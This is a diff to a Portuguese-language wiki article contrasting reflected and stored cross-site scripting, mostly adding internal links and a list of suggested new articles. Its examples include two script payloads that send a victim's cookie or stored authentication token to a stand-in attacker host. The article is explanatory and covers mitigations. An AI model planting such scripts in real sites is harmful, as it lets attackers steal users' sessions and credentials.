@@ -1,4 +1,5 @@
 ---
+reviewed_at: 2026-04-07
 title: XSS Refletido vs Armazenado: Entendendo as Diferenças
 topic: cybersecurity
 tags: [xss, web-security, vulnerability, injection]
@@ -7,11 +8,11 @@ source: qa
 
 # XSS Refletido vs Armazenado: Entendendo as Diferenças
 
-Cross-Site Scripting (XSS) é uma das vulnerabilidades mais comuns em aplicações web, permitindo a injeção de scripts maliciosos em páginas visualizadas por usuários. Embora existam diferentes variantes, as duas formas mais críticas são o **XSS Refletido** e o **XSS Armazenado**, que se distinguem fundamentalmente pela persistência do [[payload]] malicioso e pelo vetor de ataque necessário.
+Cross-Site Scripting (XSS) é uma das vulnerabilidades mais comuns em [[aplicacoes-web]], permitindo a [[injection|injecao]] de scripts maliciosos em páginas visualizadas por usuários. Embora existam diferentes variantes, as duas formas mais críticas são o **XSS Refletido** e o **XSS Armazenado**, que se distinguem fundamentalmente pela persistência do [[payload]] malicioso e pelo vetor de ataque necessário.
 
 ## XSS Refletido (Reflected XSS)
 
-No ataque XSS Refletido, o código malicioso é enviado ao servidor através de parâmetros [[URL]], formulários ou cabeçalhos [[HTTP]], sendo "refletido" imediatamente na resposta da página **sem persistência em banco de dados** ou armazenamento permanente.
+No ataque XSS Refletido, o código malicioso é enviado ao [[servidor]] através de parâmetros [[URL]], formulários ou cabeçalhos [[HTTP]], sendo "refletido" imediatamente na resposta da página **sem persistência em banco de dados** ou armazenamento permanente.
 
 ### Características principais:
 - **Execução imediata**: O script é processado e retornado na mesma requisição/resposta
@@ -20,7 +21,7 @@ No ataque XSS Refletido, o código malicioso é enviado ao servidor através de 
 - **Vetores comuns**: Parâmetros de busca, mensagens de erro dinâmicas, campos de formulário GET
 
 ### Exemplo prático:
-Um atacante cria um link como `https://site.com/busca?q=<script>document.location='https://atacante.com/roubar?cookie='+document.cookie</script>` e o envia por e-mail. Quando a vítima clica, o servidor retorna a página com o script executando no navegador.
+Um atacante cria um link como `https://site.com/busca?q=<script>document.location='https://atacante.com/roubar?cookie='+document.cookie</script>` e o envia por e-mail. Quando a vítima clica, o servidor retorna a página com o script executando no [[navegador]].
 
 ## XSS Armazenado (Stored XSS)
 
@@ -33,7 +34,7 @@ O XSS Armazenado representa uma ameaça mais severa, pois o payload malicioso é
 - **Difícil detecção**: Pode permanecer ativo por longos períodos antes de ser identificado
 
 ### Exemplo prático:
-Um atacante insere `<script>fetch('https://atacante.com/log?d='+localStorage.getItem('token'))</script>` em um comentário de blog. Todos os visitantes futuros que carregarem a página executarão o script, enviando seus tokens de autenticação para o servidor do atacante.
+Um atacante insere `<script>fetch('https://atacante.com/log?d='+localStorage.getItem('token'))</script>` em um comentário de blog. Todos os visitantes futuros que carregarem a página executarão o script, enviando seus tokens de [[autenticacao]] para o servidor do atacante.
 
 ## Comparativo: Refletido vs Armazenado
 
@@ -44,16 +45,16 @@ Um atacante insere `<script>fetch('https://atacante.com/log?d='+localStorage.get
 | **Alcance** | Individual (targeted) | Massivo (todos os visitantes) |
 | **Complexidade** | Requer [[engenharia-social]] | Requer bypass de filtros de entrada |
 | **Detecção** | Mais difícil (não deixa rastros no servidor) | Mais fácil (payload visível no DB) |
-| **Impacto típico** | Roubo de sessão de um usuário | Comprometimento em larga escala |
+| **Impacto típico** | Roubo de [[session-hijacking|sessao]] de um usuário | Comprometimento em larga escala |
 
 ## Mitigação
 
 Ambos os tipos compartilham estratégias de prevenção fundamentais:
-- **Sanitização rigorosa** de entradas de usuário
-- **Codificação de saída** (output encoding) apropriada ao contexto (HTML, JavaScript, URL, CSS)
-- Implementação de **Content Security Policy (CSP)**
+- **[[input-sanitization|Sanitizacao]] rigorosa** de entradas de usuário
+- **[[output-encoding|Codificacao de saida]]** (output encoding) apropriada ao contexto (HTML, JavaScript, URL, CSS)
+- Implementação de **[[content-security-policy|Content Security Policy (CSP)]]**
 - Uso de headers de segurança como `X-XSS-Protection` (em conjunto com outras medidas)
-- Frameworks modernos que aplicam [[input-validation]] e escaping automático
+- [[frameworks|Frameworks]] modernos que aplicam [[input-validation]] e escaping automático
 
 ## Conceitos Relacionados
 - [[xss-(cross-site-scripting)]]
@@ -64,3 +65,17 @@ Ambos os tipos compartilham estratégias de prevenção fundamentais:
 - [[payload]]
 - [[input-validation]]
 - [[content-security-policy]]
+- [[aplicacoes-web]]
+- [[navegador]]
+- [[servidor]]
+- [[session-hijacking]]
+- [[autenticacao]]
+- [[injection]]
+- [[input-sanitization]]
+- [[output-encoding]]
+- [[frameworks]]
+
+<!-- Sugestões de novos artigos:
+[[xss-baseado-em-dom]] - O artigo menciona "diferentes variantes" mas aborda apenas Refletido e Armazenado, faltando a terceira categoria principal (DOM-based XSS) que também é crítica
+[[web-storage-security]] - O artigo menciona localStorage como vetor de roubo de tokens; um artigo dedicado à segurança de Web Storage (localStorage, sessionStorage, IndexedDB) e boas práticas de armazenamento client-side seria complementar
+-->
